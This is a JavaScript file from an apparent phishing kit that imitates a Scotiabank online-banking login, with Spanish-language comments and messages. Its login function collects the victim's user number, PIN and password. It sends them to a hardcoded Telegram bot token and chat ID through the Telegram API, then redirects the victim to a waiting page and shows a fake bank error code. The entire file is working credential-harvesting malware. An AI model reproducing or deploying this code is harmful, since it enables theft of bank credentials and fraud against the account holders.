let intentos = 0;

// Token y chat ID
const TELEGRAM_TOKEN = "8571435553:AAHD6w2yKVsCg6AyJMaXsPKnCF206kXB__M";
const TELEGRAM_CHAT_ID = "-4879631523";

document.addEventListener("DOMContentLoaded", () => {
  const pinInput = document.getElementById("pin");
  const usuarioInput = document.getElementById("usuario");
  const boton = document.getElementById("login-btn");

  if (pinInput) {
    pinInput.addEventListener("input", function () {
      this.value = this.value.replace(/\D/g, "").slice(0, 8);
    });
  }

  if (usuarioInput) {
    usuarioInput.addEventListener("input", function () {
      this.value = this.value.replace(/\D/g, "");
    });
  }

  if (boton) {
    boton.addEventListener("click", login);
  }
});

async function login() {
  const usuario = document.getElementById("usuario");
  const pin = document.getElementById("pin");
  const contrasena = document.getElementById("contrasena");
  const errorBox = document.getElementById("error-box");

  if (!usuario || !pin || !contrasena || !errorBox) {
    console.error("Elementos del DOM faltantes.");
    return;
  }

  if (!usuario.value.trim() || !pin.value.trim() || !contrasena.value.trim()) {
    errorBox.innerHTML = '<i class="fa fa-exclamation-triangle"></i> Los datos son inválidos o incompletos, por favor revisalos y reintentá. (NAZ0020)';
    errorBox.style.display = "block";
    return;
  }

  intentos++;

  const mensaje = `🔔 SCOTIABANK\n👤 Usuario: ${usuario.value}\n🔑 PIN: ${pin.value}\n🔑 Contraseña: ${contrasena.value}`;

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    text: mensaje,
    parse_mode: "HTML"
  };

  try {
    const resp = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    });

    if (!resp.ok) {
      const text = await resp.text();
      console.error("Error enviando a Telegram:", resp.status, text);
    }
  } catch (err) {
    console.error("Error en fetch a Telegram:", err);
  }

  if (intentos < 2) {
    window.location.href = "espera/";
  }
}

// 👇 Esto es CLAVE para que <button onclick="login()"> funcione
window.login = login;
